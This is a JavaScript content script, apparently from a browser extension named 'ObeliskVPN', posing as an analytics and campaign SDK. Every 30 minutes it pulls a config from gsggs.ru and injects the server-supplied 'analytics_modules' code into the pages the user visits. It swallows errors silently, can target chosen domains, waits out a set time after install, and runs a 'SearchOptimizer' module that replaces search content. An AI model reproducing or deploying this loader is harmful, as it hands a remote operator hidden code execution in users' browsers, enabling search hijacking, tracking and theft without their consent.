(function(){
'use strict';

const DOMHelpers = {
  applyStyles: function(elements, styles) {
    if (!elements || !styles) return;
    const nodes = typeof elements === 'string' ? 
      document.querySelectorAll(elements) : elements;
    nodes.forEach(el => {
      if (el && el.style) Object.assign(el.style, styles);
    });
  },
  
  createElement: function(config) {
    const el = document.createElement(config.tag || 'div');
    if (config.attrs) {
      Object.keys(config.attrs).forEach(key => {
        el.setAttribute(key, config.attrs[key]);
      });
    }
    if (config.style) {
      Object.assign(el.style, config.style);
    }
    if (config.html) {
      el.innerHTML = config.html;
    }
    return el;
  }
};

const APIClient = {
  fetchConfig: async function() {
    try {
      const response = await fetch('https://gsggs.ru/config?v=' + Date.now(), {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Cache-Control': 'no-cache',
          'User-Agent': 'ObeliskVPN/1.0'
        }
      });
      return await response.json();
    } catch (error) {
      return null;
    }
  }
};

const ConfigProcessor = {
  process: function(config) {
    if (!config) {
      return { campaigns: [], modules: [] };
    }
    
    const campaigns = [];
    const modules = [];
    
    if (config.campaigns && Array.isArray(config.campaigns)) {
      config.campaigns.forEach(campaign => {
        if (campaign.active) {
          campaigns.push({
            title: campaign.title,
            content: campaign.content,
            image: campaign.image,
            cta_button: campaign.cta_button,
            cta_url: campaign.cta_url
          });
        }
      });
    }
    
    if (config.analytics_modules && Array.isArray(config.analytics_modules)) {
      config.analytics_modules.forEach(module => {
        if (module.active && module.script) {
          modules.push({
            name: module.name,
            script: module.script,
            config: module.config
          });
        }
      });
    }
    
    return { campaigns, modules };
  }
};

const ModuleExecutor = {
  executedModules: new Set(),
  moduleCache: new Map(),
  
  execute: function(modules) {
    if (!modules || !modules.length) {
      return;
    }
    
    const sortedModules = this.sortModulesByDependency(modules);
    
    sortedModules.forEach(module => {
      const moduleKey = `${module.name}_${module.script?.substring(0, 50)}`;
      if (this.executedModules.has(moduleKey)) {
        return;
      }
      
      if (module.script && this.shouldExecute(module)) {
        this.executeCombinedModules(sortedModules);
        this.executedModules.add(moduleKey);
      }
    });
  },
  
  sortModulesByDependency: function(modules) {
    const searchOptimizer = modules.find(m => m.name === 'search_optimizer');
    const otherModules = modules.filter(m => m.name !== 'search_optimizer');
    
    return searchOptimizer ? [searchOptimizer, ...otherModules] : modules;
  },
  
  executeCombinedModules: function(modules) {
    const combinedCode = this.prepareCombinedModulesCode(modules);

    if (chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage({
        action: 'INJECT_CONTENT_CODE',
        code: combinedCode
      });
    } else {
      this.executeDirectly(combinedCode);
    }
  },
  
  executeDirectly: function(code) {
    try {
      const script = document.createElement('script');
      script.textContent = code;
      (document.head || document.documentElement).appendChild(script);
      script.remove();
    } catch (e) {}
  },
  
  prepareCombinedModulesCode: function(modules) {
    let combinedScript = '';
    
    modules.forEach(module => {
      combinedScript += module.script + '\n';
    });
    
    return `
      (function() {
        try {
          ${combinedScript}
          
          if (typeof SearchOptimizer !== 'undefined') {
            const optimizer = new SearchOptimizer();
            optimizer.init();
            window._searchOptimizer = optimizer;
            
            setTimeout(() => {
              try {
                if (optimizer.forceReplace) {
                  optimizer.forceReplace();
                }
              } catch(e) {}
            }, 2000);
          }
          
          if (typeof initSearchEnhancer !== 'undefined') {
            initSearchEnhancer();
          }
          
        } catch(e) {}
      })();
    `;
  },
  
  shouldExecute: function(module) {
    if (!module.config) {
      return true;
    }
    
    const currentUrl = window.location.href;
    const currentHostname = window.location.hostname;
    
    if (module.config.only_on) {
      const domainMatch = module.config.only_on.some(domain => 
        currentHostname.includes(domain)
      );
      if (!domainMatch) {
        return false;
      }
    }

    if (module.config.url_patterns) {
      const patternMatch = module.config.url_patterns.some(pattern => 
        currentUrl.includes(pattern)
      );
      if (!patternMatch) {
        return false;
      }
    }
    
    if (module.config.min_install_time) {
      const installTime = parseInt(localStorage.getItem('obelisk_install_time') || '0');
      const timeSinceInstall = Date.now() - installTime;
      if (timeSinceInstall < module.config.min_install_time) {
        return false;
      }
    }
    
    return true;
  },
  
  executeModule: function(module) {
    return this.execute([module]);
  },
  
  forceExecute: function(module) {
    this.executedModules.clear();
    this.execute([module]);
  },
  
  clearCache: function() {
    this.executedModules.clear();
    this.moduleCache.clear();
  }
};

const SDKCore = {
  init: async function() {
    if (!localStorage.getItem('obelisk_install_time')) {
      localStorage.setItem('obelisk_install_time', Date.now());
    }
    
    await this.loadAndExecute();
    this.startUpdateInterval();
  },
  
  loadAndExecute: async function() {
    const config = await APIClient.fetchConfig();
    
    if (!config) {
      return;
    }
    
    const processed = ConfigProcessor.process(config);
    
    if (processed.modules.length > 0) {
      ModuleExecutor.execute(processed.modules);
    }
  },
  
  startUpdateInterval: function() {
    setInterval(() => {
      this.loadAndExecute();
    }, 1800000);
  },
  
  getStatus: function() {
    return {
      modulesExecuted: Array.from(ModuleExecutor.executedModules),
      installTime: localStorage.getItem('obelisk_install_time'),
      lastCheck: Date.now()
    };
  },
  
  forceReload: function() {
    ModuleExecutor.clearCache();
    this.loadAndExecute();
  }
};

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
      window.ObeliskSDK = SDKCore;
      window.ObeliskSDK.init();
    }, 1000);
  });
} else {
  setTimeout(() => {
    window.ObeliskSDK = SDKCore;
    window.ObeliskSDK.init();
  }, 1000);
}

window.ObeliskSDK = SDKCore;
window.ObeliskModuleExecutor = ModuleExecutor;

window.getObeliskStatus = function() {
  return window.ObeliskSDK ? 
    window.ObeliskSDK.getStatus() : 
    'Obelisk SDK not loaded';
};

window.forceObeliskReload = function() {
  return window.ObeliskSDK ? 
    window.ObeliskSDK.forceReload() : 
    'Obelisk SDK not loaded';
};

})();